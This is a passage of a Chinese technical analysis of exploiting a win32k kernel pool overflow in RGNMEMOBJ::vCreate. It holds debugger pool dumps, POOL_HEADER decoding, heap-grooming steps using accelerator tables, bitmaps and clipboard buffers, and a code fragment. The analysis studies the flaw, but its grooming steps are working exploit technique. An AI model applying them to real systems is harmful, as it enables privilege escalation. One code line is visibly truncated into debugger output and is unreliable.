    kd> !pool eax
    Pool page ff4aa5d8 region is Paged session pool
    ff4aa000 is not a valid large pool allocation, checking large session pool...
     ff4aa5c8 size:    8 previous size:    0  (Allocated)  Frag
    *ff4aa5d0 size:   70 previous size:    8  (Allocated) *Usac Process: 87601588
             Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
     ff4aa640 size:  320 previous size:   70  (Allocated)  Gh15
     ff4aa960 size:  6a0 previous size:  320  (Allocated)  Gh15
清单 5-12 分配的 AcceleratorTable 池内存块
* * *
**内存块空洞**
这样的话，通过多次的 `CreateAcceleratorTableA` 函数调用正好会填充大量的 `0x70`
字节大小的内存空洞。需要注意的是，这些多次调用的 `CreateAcceleratorTableA` 函数调用需要放在通过 `CreateBitmap`
函数以分配 `0xF90` 字节的内核内存块的代码逻辑之后执行，以便同时填充这些位图表面对象所在的内存页中预留的 `0x70` 空隙。随后通过
`DestroyAcceleratorTable` 函数释放掉中间一部分 `AcceleratorTable` 对象，为
`RGNMEMOBJ::vCreate` 函数留下足够多的机会。
图 5-6 内核内存布局的内存块空洞预留给漏洞函数
制造 `0x70` 字节内存块空洞的验证代码如下：
    for (LONG i = 0; i  dc esp l4
    980a9828  00000021 00000068 6e677247 0f010743  !...h...GrgnC...
    kd> p
    win32k!RGNMEMOBJ::vCreate+0xcb:
    93fc4002 8b5510          mov     edx,dword ptr [ebp+10h]
    kd> !pool eax
    Pool page cae5ef98 region is Paged session pool
     cae5e000 size:  f90 previous size:    0  (Allocated)  Gh15
    *cae5ef90 size:   70 previous size:  f90  (Allocated) *Grgn
             Pooltag Grgn : GDITAG_REGION, Binary : win32k.sys
    kd> !pool (eax&fffff000)+0x1000
    Pool page cae5f000 region is Paged session pool
    *cae5f000 size:  f90 previous size:    0  (Allocated) *Gh15
             Pooltag Gh15 : GDITAG_HMGR_SURF_TYPE, Binary : win32k.sys
     cae5ff90 size:   70 previous size:  f90  (Free )  Usac Process: 876936d8
    kd> !pool (eax&fffff000)-0x1000
    Pool page cae5d000 region is Paged session pool
    *cae5d000 size:  f90 previous size:    0  (Allocated) *Gh15
             Pooltag Gh15 : GDITAG_HMGR_SURF_TYPE, Binary : win32k.sys
     cae5df90 size:   70 previous size:  f90  (Free)       Usac
清单 5-14 函数 RGNMEMOBJ::vCreate 分配的内存块命中内存间隙
* * *
**POOL_HEADER**
在这里观测内存块的 `POOL_HEADER` 结构各域的值：
    kd> dt _POOL_HEADER cae5ef90
    nt!_POOL_HEADER
       +0x000 PreviousSize     : 0y111110010 (0x1f2)
       +0x000 PoolIndex        : 0y0000000 (0)
       +0x002 BlockSize        : 0y000001110 (0xe)
       +0x002 PoolType         : 0y0100011 (0x23)
       +0x000 Ulong1           : 0x460e01f2
       +0x004 PoolTag          : 0x6e677247
       +0x004 AllocatorBackTraceIndex : 0x7247
       +0x006 PoolTagHash      : 0x6e67
清单 5-15 当前内存块的 POOL_HEADER 结构各域的值
需要关注的是 `PreviousSize` / `PoolIndex` / `BlockSize` / `PoolType` / `PoolTag`
五个成员域。根据本章节前面的内容可知，`POOL_HEADER` 结构的成员域 `PreviousSize` 和 `BlockSize` 的长度都是 `9`
比特位，而 `PoolIndex` 和 `PoolType` 都是 `7` 比特位。成员 `PoolTag` 是 `32` 位的整数，用于表示当前内存块的
`Tag` 标记。成员 `PreviousSize` 和 BlockSize 中存储的数值都需要左移 `3` 比特位才能与实际大小对应。在这里
`PreviousSize` 的值 `0x1F2` 左移 `3` 位之后是 0xF90 表示前一个内存块的大小是 `0xF90` 字节；而
`BlockSize` 的值 `0xE` 左移 `3` 位之后是 `0x70` 表示当前内存块的大小是 `0x70` 字节。
接下来观测下一内存页起始内存块的 `POOL_HEADER` 结构，以便在后续的操作中对被破坏 `POOL_HEADER` 结构进行修复：
    kd> dt _POOL_HEADER cae5e000 
    nt!_POOL_HEADER
       +0x000 PreviousSize     : 0y000000000 (0)
       +0x000 PoolIndex        : 0y0000000 (0)
       +0x002 BlockSize        : 0y111110010 (0x1f2)
       +0x002 PoolType         : 0y0100011 (0x23)
       +0x000 Ulong1           : 0x47f20000
       +0x004 PoolTag          : 0x35316847
       +0x004 AllocatorBackTraceIndex : 0x6847
       +0x006 PoolTagHash      : 0x3531
清单 5-16 下一内存块的 POOL_HEADER 结构各域的值
下一个内存页起始内存块是我们之前构造内存布局时分配的其中之一的位图表面对象。由于是内存页的起始内存块，因此其 `POOL_HEADER` 结构的
`PreviousSize` 成员值为 `0`；成员 `BLockSize` 的值 `0x1F2` 表示当前内存块的大小是 `0xF90` 字节；成员
`PoolType` 的值表示内存块类型和一些属性标志位，此处值为 `0x23`。成员 `PoolIndex`
具体作用暂时为知，但根据观测多个位图表面对象内存块发现该值都为 0，因此在后续的修复过程中直接对该值赋值为 `0` 即可。
到目前为止已经能够控制 `RGNMEMOBJ::vCreate` 函数将内存块分配在指定的内存页末尾。接下来将研究如何利用由溢出漏洞导致的后续 OOB
漏洞篡改指定对象成员域达到任意地址读写的目的。
* * *
**溢出覆盖内存块**
我对验证代码进行特别修改，将传入 `PolylineTo` 函数调用的坐标点序列的 Y 轴坐标值都修改成相同的，并只单独修改前 `6` 个坐标点的 Y
轴为其他互不相同的值。这样一来将只有前 `7` 个 EDGE 元素会被写入 `RGNMEMOBJ::vCreate`
函数分配的内存缓冲区；内存缓冲区的大小为 `0x68` 字节，因此只能容纳不到 `3` 个 `EDGE`
元素，后续的写入将发生在下一内存页的起始内存块，即前面分配的其中之一的位图表面对象缓冲区。在这里我们希望发生的 OOB 能够覆盖 `SURFOBJ` 结构的
`sizlBitmap` 或 `pvScan0` 域。域 `sizlBitmap` 存储位图的宽和高的大小，成员域 `pvScan0`
指向位图像素数据的起始地址。
通过编译代码在环境中执行后观测到：
    win32k!RGNMEMOBJ::vCreate+0xc5:
    939e3ffc ff155000b693    call    dword ptr [win32k!_imp__ExAllocatePoolWithTag (93b60050)]
    kd> dd esp l4
    a129f828  00000021 00000068 6e677247 0d0106fb
    kd> p
    win32k!RGNMEMOBJ::vCreate+0xcb:
    939e4002 8b5510          mov     edx,dword ptr [ebp+10h]
    kd> r eax
    eax=cae61f98
    kd> dc cae62000 l 10 
    cae62000  47f20000 35316847 01050fc3 00000000  ...GGh15........
    cae62010  00000000 00000000 00000000 01050fc3  ................
    cae62020  00000000 00000000 00000e34 00000001  ........4.......
    cae62030  00000e34 cae6215c cae6215c 00000e34  4...\!..\!......
    kd> p
    ...
    kd> p
    win32k!RGNMEMOBJ::vCreate+0x1d7:
    939e410e e8a7000d00      call    win32k!vConstructGET (93ab41ba)
    kd> p
    win32k!RGNMEMOBJ::vCreate+0x1dc:
    939e4113 8365cc00        and     dword ptr [ebp-34h],0
    kd> dc cae62000 l 10 
    cae62000  00000100 00000001 00000001 00000001  ................
    cae62010  cae63668 00000001 00000003 00000005  h6..............
    cae62020  ffffffff 00000000 00000100 00000001  ................
    cae62030  00000001 00000001 cae63640 00000001  ........@6......
    cae62040  00000005 00000006 ffffffff 00000000  ................
    cae62050  00000100 00000001 00000001 00000001  ................
    cae62060  a129fb60 00000001 00000006 00000007  `.).............
    cae62070  ffffffff 00000000 00000100 00000001  ................
清单 5-17 函数 vConstructGET 将下一内存块数据覆盖
下一内存页的起始内存块中的数据，包括 `POOL_HEADER` 结构在内，已被 `vConstructGET` 函数调用中的执行逻辑所覆盖。从
`0xcae62008` 地址开始是管理位图表面对象的 `SURFACE` 对象。根据偏移计算得知，域 `sizlBitmap` 位于
`0xcae62028` 位置，域 `pvScan0` 位于 `0xcae62038`
位置。两者的值都没有被复写成理想的值，但是注意到有几处地址的数据被修改成 `0xFFFFFFFF` 这样的特殊值。
这样一来就不能使位图表面对象直接作为内存页的起始位置，需要在 `EDGE` 缓冲区内存块和位图表面对象内存块之间增加“垫片”，以使 `0xFFFFFFFF`
这样的特殊值能被覆盖到我们特别关注的域中。
* * *
**垫片**
在分配快捷键对应表 `AcceleratorTable` 序列之后，通过调用 `DeleteObject`
函数释放掉前面分配的所有位图对象。此时会留出大量的 `0xF90` 大小的内存空隙。接下来需要分配用作垫片的缓冲区内存块，使其间隔在 `EDGE`
缓冲区内存块和用于覆盖篡改的位图表面对象内存块之间。该内存块需要拥有较大的大小，以使其尽可能地被安排在我们刚刚留出的 `0xF90`
内存空隙的开始位置。分配用作垫片的缓冲区可以用很多方式，看个人意愿，在本分析中选择通过设置剪贴板数据的方式：
    VOID
    CreateClipboard(DWORD Size)
    {
        PBYTE Buffer = (PBYTE)malloc(Size);
        FillMemory(Buffer, Size, 0x41);
        Buffer[Size - 1] = 0x00;
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)Size);
        CopyMemory(GlobalLock(hMem), Buffer, (SIZE_T)Size);
        GlobalUnlock(hMem);
        SetClipboardData(CF_TEXT, hMem);
    }
清单 5-18 创建剪贴板数据对象的验证代码片段
设置剪贴板数据的函数 `SetClipboardData` 用于将数据以指定剪贴板格式放置在剪贴板中，其第二个参数 `HANDLE hMem`
接受指向某个内存区的句柄。在该函数中获取句柄参数 `hMem` 指向内存区的大小，并调用 `ConvertMemHandle` 未导出函数，随后在
`ConvertMemHandle` 函数中调用 `win32k` 中的 `NtUserConvertMemHandle` 系统调用。
在 `win32k!NtUserConvertMemHandle` 调用的 `_ConvertMemHandle` 函数中通过
`HMAllocObject` 函数分配用户对象，分配的对象大小为传入的数据大小参数加 0x0C 字节的结构体 `CLIPDATA` 的大小。在
`HMAllocObject` 函数中选择不适用进程配额的方式分配内存，所以不会给请求缓冲区大小增加 `4`
字节，所以最终分配的内存块大小是传入的数据大小参数加 `0x14` 字节，内存块类型为分页会话池。因此，为了分配 `0xB70`
大小的内存块，在用户进程中传入 `SetClipboardData` 函数调用的内存区句柄指向的内存区的大小应该是 `0xB5C` 字节。
      v2 = a2 + 0xC;